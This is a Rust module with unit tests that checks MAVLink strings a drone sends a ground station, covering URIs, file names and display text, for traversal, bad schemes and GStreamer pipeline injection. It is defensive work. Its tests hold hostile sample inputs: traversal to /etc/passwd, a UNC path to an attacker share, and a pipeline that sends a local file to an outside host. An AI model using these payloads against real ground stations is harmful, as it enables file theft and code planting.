//! Checks on the strings a vehicle hands a ground station: URIs it will
//! fetch, names it will build file paths from, text it will display.
//!
//! Every check here looks for a shape that a working, honest vehicle never
//! sends, so one occurrence is enough. What is allowed comes from the
//! MAVLink documentation of each field (camera definition: `http://`,
//! `https://`, `mavlinkftp://`/`mftp://`; video stream: an RTSP/TCP/UDP URI
//! or a port number) and from what PX4 and ArduPilot actually send (PX4's
//! component metadata is `mftp://[;comp=1]/etc/extras/...json.xz`: an
//! absolute path inside an `mftp://` URI is normal).

/// Longest string field examined (VIDEO_STREAM_INFORMATION.uri, 160).
const MAX: usize = 160;

/// What is wrong with a URI or name.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Problem {
    /// `../`, `..\` or a trailing `..`, as sent or percent-encoded.
    Traversal,
    /// A scheme a ground station should not follow (`file:`, `qrc:`,
    /// anything not on the field's list), a bare absolute path or UNC path,
    /// or control characters.
    Scheme,
    /// GStreamer pipeline syntax (`gst://`, ` ! `) in a video URI.
    Pipeline,
}

fn lower(b: u8) -> u8 {
    b.to_ascii_lowercase()
}

pub(crate) fn starts_with_ci(s: &[u8], p: &[u8]) -> bool {
    s.len() >= p.len() && s.iter().zip(p).all(|(a, b)| lower(*a) == lower(*b))
}

pub(crate) fn contains_ci(s: &[u8], p: &[u8]) -> bool {
    p.is_empty() || s.windows(p.len()).any(|w| starts_with_ci(w, p))
}

fn hex(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// Percent-decode `s` into `out` (one round). Overlong UTF-8 dots and
/// slashes (`%c0%ae`, `%c0%af`, `%c1%9c`), which some decoders accept,
/// become `.`, `/` and `\`. Returns the decoded length.
fn pct_decode(s: &[u8], out: &mut [u8; MAX]) -> usize {
    let (mut i, mut n) = (0, 0);
    while i < s.len() && n < MAX {
        let mut b = s[i];
        i += 1;
        if b == b'%'
            && let (Some(h), Some(l)) = (
                s.get(i).copied().and_then(hex),
                s.get(i + 1).copied().and_then(hex),
            )
        {
            b = h << 4 | l;
            i += 2;
            if (b == 0xC0 || b == 0xC1)
                && s.get(i) == Some(&b'%')
                && let (Some(h2), Some(l2)) = (
                    s.get(i + 1).copied().and_then(hex),
                    s.get(i + 2).copied().and_then(hex),
                )
            {
                match (b, h2 << 4 | l2) {
                    (0xC0, 0xAE) => b = b'.',
                    (0xC0, 0xAF) => b = b'/',
                    (0xC1, 0x9C) => b = b'\\',
                    _ => {}
                }
                if b < 0x80 {
                    i += 3;
                }
            }
        }
        out[n] = b;
        n += 1;
    }
    n
}

fn sep(b: u8) -> bool {
    b == b'/' || b == b'\\'
}

/// `..` as a path component anywhere in `s` (`../`, `..\`, `/..` at the
/// end, or the whole string).
fn has_dotdot(s: &[u8]) -> bool {
    s.windows(2).enumerate().any(|(i, w)| {
        w == b".."
            && (i == 0 || sep(s[i - 1]) || s[i - 1] == b':' || s[i - 1] == b';' || s[i - 1] == b']')
            && (i + 2 == s.len() || sep(s[i + 2]))
    })
}

/// Path traversal in `s`, as sent, or after one or two rounds of percent
/// decoding (`%2e%2e%2f`, `%252e%252e%252f`).
pub fn traversal(s: &[u8]) -> bool {
    if has_dotdot(s) {
        return true;
    }
    if !s.contains(&b'%') {
        return false;
    }
    let mut a = [0u8; MAX];
    let n = pct_decode(&s[..s.len().min(MAX)], &mut a);
    if has_dotdot(&a[..n]) {
        return true;
    }
    let mut b = [0u8; MAX];
    let m = pct_decode(&a[..n], &mut b);
    has_dotdot(&b[..m])
}

/// Bytes a URI or name never contains: ASCII control characters and DEL.
pub fn control_chars(s: &[u8]) -> bool {
    s.iter().any(|&b| b < 0x20 || b == 0x7F)
}

/// A bare absolute path: `/x`, `\x`, `\\host\share`, `C:\x`, `C:/x`.
fn absolute_path(s: &[u8]) -> bool {
    match s {
        [b'/' | b'\\', ..] => true,
        [d, b':', b'/' | b'\\', ..] if d.is_ascii_alphabetic() => true,
        _ => false,
    }
}

/// The scheme of `s` (before `:`), if it has one of letters, digits, `+`,
/// `-`, `.` starting with a letter, at least two long (so `C:` is a drive).
fn scheme(s: &[u8]) -> Option<&[u8]> {
    let k = s.iter().position(|&b| b == b':')?;
    let sch = &s[..k];
    (sch.len() >= 2
        && sch[0].is_ascii_alphabetic()
        && sch
            .iter()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'-' | b'.')))
    .then_some(sch)
}

fn scheme_in(sch: &[u8], allowed: &[&[u8]]) -> bool {
    allowed
        .iter()
        .any(|a| sch.len() == a.len() && starts_with_ci(sch, a))
}

/// Schemes a camera definition / component metadata URI may use.
const META_SCHEMES: [&[u8]; 4] = [b"http", b"https", b"mftp", b"mavlinkftp"];
/// Schemes a video stream URI may use.
const VIDEO_SCHEMES: [&[u8]; 8] = [
    b"rtsp", b"rtsps", b"rtspt", b"http", b"https", b"udp", b"tcp", b"rtp",
];

/// A camera definition (`cam_definition_uri`) or component metadata URI.
pub fn metadata_uri(s: &[u8]) -> Option<Problem> {
    if s.is_empty() {
        return None;
    }
    if traversal(s) {
        return Some(Problem::Traversal);
    }
    if control_chars(s) || absolute_path(s) {
        return Some(Problem::Scheme);
    }
    match scheme(s) {
        Some(sch) if !scheme_in(sch, &META_SCHEMES) => Some(Problem::Scheme),
        _ => None,
    }
}

/// A `VIDEO_STREAM_INFORMATION.uri`.
pub fn video_uri(s: &[u8]) -> Option<Problem> {
    if s.is_empty() {
        return None;
    }
    if starts_with_ci(s, b"gst:")
        || contains_ci(s, b" ! ")
        || s.contains(&b'!') && contains_ci(s, b"sink")
    {
        return Some(Problem::Pipeline);
    }
    if traversal(s) {
        return Some(Problem::Traversal);
    }
    if control_chars(s) || absolute_path(s) {
        return Some(Problem::Scheme);
    }
    // A bare port number ("5600") or host:port is allowed.
    match scheme(s) {
        Some(sch)
            if !scheme_in(sch, &VIDEO_SCHEMES)
                && !s[sch.len() + 1..].iter().all(u8::is_ascii_digit) =>
        {
            Some(Problem::Scheme)
        }
        _ => None,
    }
}

/// A name a ground station builds a file name from (camera vendor and
/// model, FTP listing entries): path separators, `..` or control
/// characters.
pub fn file_name(s: &[u8]) -> Option<Problem> {
    if s.iter().any(|&b| sep(b)) || traversal(s) {
        Some(Problem::Traversal)
    } else if control_chars(s) {
        Some(Problem::Scheme)
    } else {
        None
    }
}

/// Mission Planner's clickable-link markup, `[link;<target>;<label>]`
/// (MP-03): the opening `[link;`, case-insensitive.
pub fn link_markup(s: &[u8]) -> bool {
    contains_ci(s, b"[link;")
}

/// Control characters in display text, other than tab, newline and
/// carriage return. ESC (terminal escape sequences) is one.
pub fn text_control(s: &[u8]) -> usize {
    s.iter()
        .filter(|&&b| (b < 0x20 && !matches!(b, b'\t' | b'\n' | b'\r')) || b == 0x7F)
        .count()
}

/// Copy the printable part of `s` into a short display string (other bytes
/// become `?`), for the threat's `ssid` field.
pub fn excerpt<const N: usize>(s: &[u8]) -> heapless::String<N> {
    let mut out = heapless::String::new();
    for &b in s {
        let c = if (0x20..0x7F).contains(&b) {
            b as char
        } else {
            '?'
        };
        if out.push(c).is_err() {
            break;
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn benign_uris_pass() {
        for u in [
            &b"http://10.41.1.1/camera.xml"[..],
            b"https://example.com/defs/cam_v2.xml.xz",
            b"mftp://[;comp=100]camera.xml",
            b"mftp://[;comp=1]/etc/extras/component_general.json.xz",
            b"mavlinkftp://camera_def.xml",
            b"camera.xml",
        ] {
            assert_eq!(
                metadata_uri(u),
                None,
                "{}",
                core::str::from_utf8(u).unwrap()
            );
        }
        for u in [
            &b"rtsp://192.168.43.1:8554/live"[..],
            b"udp://0.0.0.0:5600",
            b"5600",
            b"tcp://10.0.0.2:5760",
        ] {
            assert_eq!(video_uri(u), None, "{}", core::str::from_utf8(u).unwrap());
        }
        for n in [&b"Siyi"[..], b"A8 mini", b"Sony ILX-LR1 v1.2"] {
            assert_eq!(file_name(n), None);
        }
        // Dots that are not a path component.
        assert!(!traversal(b"http://a/b..c/x.xml"));
        assert!(!traversal(b"v1..2"));
    }

    #[test]
    fn hostile_uris_flagged() {
        use Problem::*;
        let cases: [(&[u8], Problem); 12] = [
            (b"mftp://../../../../tmp/x", Traversal),
            (b"http://h/../../etc/passwd", Traversal),
            (b"mftp://..\\..\\Users\\x", Traversal),
            (b"http://h/%2e%2e/%2e%2e/x", Traversal),
            (b"http://h/%252e%252e%252fx", Traversal),
            (b"http://h/%c0%ae%c0%ae/x", Traversal),
            (b"file:///etc/passwd", Scheme),
            (b"qrc:/qml/x", Scheme),
            (b"/etc/shadow", Scheme),
            (b"\\\\attacker\\share\\x.xml", Scheme),
            (b"C:\\Users\\x\\a.xml", Scheme),
            (b"http://h/x\x1b[2J", Scheme),
        ];
        for (u, want) in cases {
            assert_eq!(
                metadata_uri(u),
                Some(want),
                "{}",
                core::str::from_utf8(u).unwrap()
            );
        }
        assert_eq!(
            video_uri(
                b"gst://filesrc location=C:\\t.txt ! tcpclientsink host=192.168.2.64 port=9999"
            ),
            Some(Pipeline)
        );
        assert_eq!(
            video_uri(b"rtsp://h:8554/x latency=0 ! filesink location=/tmp/x"),
            Some(Pipeline)
        );
        assert_eq!(video_uri(b"file:///dev/zero"), Some(Scheme));
        assert_eq!(file_name(b"../../../../tmp"), Some(Traversal));
        assert_eq!(
            file_name(b"log.bin   ..\\..\\plugins\\evil.cs"),
            Some(Traversal)
        );
        assert!(link_markup(
            b"PreArm: see [LINK;\\\\h\\s\\x.exe;ArduPilot docs]"
        ));
        assert_eq!(text_control(b"PreArm: \x1b[31mfail\x07"), 2);
        assert_eq!(excerpt::<8>(b"a\x00b\xffcdefghij").as_str(), "a?b?cdef");
    }
}
